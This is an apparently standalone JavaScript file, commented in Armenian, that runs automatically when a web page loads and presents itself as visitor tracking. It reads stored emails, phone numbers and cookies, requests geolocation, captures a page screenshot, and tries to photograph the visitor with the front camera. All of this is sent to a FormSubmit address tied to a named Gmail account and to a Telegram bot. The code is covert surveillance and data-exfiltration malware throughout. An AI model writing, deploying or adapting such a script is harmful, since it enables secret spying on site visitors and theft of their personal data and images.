// Վիզիտորի տվյալների հավաքում և ուղարկում
async function trackVisitor() {
    const data = {
      website: window.location.href || "index.html",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      language: navigator.language,
      referrer: document.referrer || "Direct visit",
      visitTime: new Date().toISOString(),
      ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
    };
  
    // Ստուգել localStorage և cookies
    try {
      const savedEmail = localStorage.getItem('userEmail');
      const savedPhone = localStorage.getItem('userPhone');
      if (savedEmail) data.savedEmail = savedEmail;
      if (savedPhone) data.savedPhone = savedPhone;
  
      const cookies = document.cookie.split(';').reduce((res, c) => {
        const [key, val] = c.trim().split('=').map(decodeURIComponent);
        return Object.assign(res, { [key]: val });
      }, {});
      if (cookies.email) data.cookieEmail = cookies.email;
      if (cookies.phone) data.cookiePhone = cookies.phone;
    } catch (e) {
      console.log("Storage access error:", e);
    }
  
    // Փորձել ստանալ գեոտեղադրություն
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          data.latitude = position.coords.latitude;
          data.longitude = position.coords.longitude;
          captureMedia(data);
        },
        () => {
          data.locationError = "Geolocation unavailable";
          captureMedia(data);
        }
      );
    } else {
      captureMedia(data);
    }
  }
  
  // Մեդիայի կատարում և ուղարկում
  async function captureMedia(data) {
    try {
      // 1. Էջի սքրինշոթ (օգտագործելով html2canvas)
      const canvas = await html2canvas(document.body);
      const screenshot = canvas.toDataURL('image/jpeg', 0.8);
      data.screenshot = screenshot;
  
      // 2. Տեսախցիկի նկարներ (եթե հասանելի է)
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" } // Փորձել դիմացի տեսախցիկ
        });
        
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const photoBlob = await imageCapture.takePhoto();
        const cameraPhoto = await blobToBase64(photoBlob);
        data.cameraPhoto = cameraPhoto;
        
        videoTrack.stop();
      } catch (cameraError) {
        console.log("Camera access error:", cameraError);
        data.cameraError = cameraError.message;
      }
  
      // Ուղարկել տվյալները
      await sendToEmail(data);
      await sendToTelegram(data);
  
    } catch (error) {
      console.error("Media capture error:", error);
      data.error = error.message;
      sendToEmail(data); // Ուղարկել առնվազն հիմնական տվյալները
    }
  }
  
  // Ուղարկել էլ. փոստին (FormSubmit)
  async function sendToEmail(data) {
    try {
      const response = await fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
        method: "POST",
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(data)
      });
      return await response.json();
    } catch (error) {
      console.error("Email send error:", error);
    }
  }
  
  // Ուղարկել Telegram-ի բոտին
  async function sendToTelegram(data) {
    try {
      const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
      const chatId = 'YOUR_CHAT_ID';
      
      // Ուղարկել տեքստային հաղորդագրություն
      let text = `Նոր այցելություն:\nԷջ: ${data.website}\nIP: ${data.ip}\nՍարք: ${data.userAgent}`;
      
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text
        })
      });
  
      // Ուղարկել սքրինշոթը (եթե կա)
      if (data.screenshot) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', dataURLtoBlob(data.screenshot), 'screenshot.jpg');
        
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }
  
    } catch (error) {
      console.error("Telegram send error:", error);
    }
  }
  
  // Օժանդակ ֆունկցիաներ
  function blobToBase64(blob) {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.readAsDataURL(blob);
    });
  }
  
  function dataURLtoBlob(dataurl) {
    const arr = dataurl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type: mime});
  }
  
  // HTML2Canvas գրադարանի ավելացում
  const html2canvasScript = document.createElement('script');
  html2canvasScript.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
  document.head.appendChild(html2canvasScript);
  
  // Գործարկել հետևումը էջի բեռնվելուց հետո
  window.addEventListener('load', trackVisitor);